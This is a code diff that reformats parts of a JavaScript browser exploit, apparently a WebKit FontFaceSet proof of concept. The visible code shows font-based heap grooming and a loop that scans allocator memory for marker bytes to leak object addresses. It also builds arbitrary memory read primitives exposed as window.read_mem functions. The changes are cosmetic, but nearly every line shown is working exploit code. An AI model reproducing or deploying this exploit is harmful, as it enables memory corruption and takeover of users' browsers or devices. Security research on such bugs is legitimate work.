@@ -10,13 +10,11 @@ var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
 function poc() {
-
-function hex(n)
-{
-    if((typeof n) != "number")
-        return ""+n;
-    return "0x" + (new Number(n)).toString(16);
-}
+    function hex(n) {
+        if ((typeof n) != "number")
+            return "" + n;
+        return "0x" + (new Number(n)).toString(16);
+    }
 
     var union = new ArrayBuffer(8);
     var union_b = new Uint8Array(union);
@@ -136,7 +134,7 @@ function hex(n)
         mkString(HASHMAP_BUCKET, p_s);
 
     var needfix = [];
-    for (var i = 0;; i++) {
+    for (var i = 0; ; i++) {
         ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
         var badstr2 = mkString(HASHMAP_BUCKET, p_s);
         needfix.push(mkString(HASHMAP_BUCKET, p_s));
@@ -193,7 +191,7 @@ function hex(n)
 
     while (jsvalue_leak === null) {
         Object.defineProperties({}, props);
-        for (var i = 0;; i++) {
+        for (var i = 0; ; i++) {
             if (fastmalloc.charCodeAt(i) == 0x42 &&
                 fastmalloc.charCodeAt(i + 1) == 0x44 &&
                 fastmalloc.charCodeAt(i + 2) == 0x43 &&
@@ -327,34 +325,30 @@ function hex(n)
         arw_master[6] = sz;
     }
 
-    window.read_mem_s = function(p, sz)
-{
-    read_mem_setup(p, sz);
-    return ""+arw_slave;
-}
+    window.read_mem_s = function (p, sz) {
+        read_mem_setup(p, sz);
+        return "" + arw_slave;
+    }
 
-window.read_mem_b = function(p, sz)
-{
-    read_mem_setup(p, sz);
-    var b = new Uint8Array(sz);
-    b.set(arw_slave);
-    return b;
-}
+    window.read_mem_b = function (p, sz) {
+        read_mem_setup(p, sz);
+        var b = new Uint8Array(sz);
+        b.set(arw_slave);
+        return b;
+    }
 
-window.read_mem_as_string = function(p, sz)
-{
-    var x = read_mem_b(p, sz);
-    var ans = '';
-    for(var i = 0; i < x.length; i++)
-        ans += String.fromCharCode(x[i]);
-    return ans;
-}
+    window.read_mem_as_string = function (p, sz) {
+        var x = read_mem_b(p, sz);
+        var ans = '';
+        for (var i = 0; i < x.length; i++)
+            ans += String.fromCharCode(x[i]);
+        return ans;
+    }
 
-window.ref_mem = function(p, sz)
-{
-    read_mem_setup(p, sz);
-    return arw_slave;
-}
+    window.ref_mem = function (p, sz) {
+        read_mem_setup(p, sz);
+        return arw_slave;
+    }
 
     window.read_mem = function (p, sz) {
         read_mem_setup(p, sz);
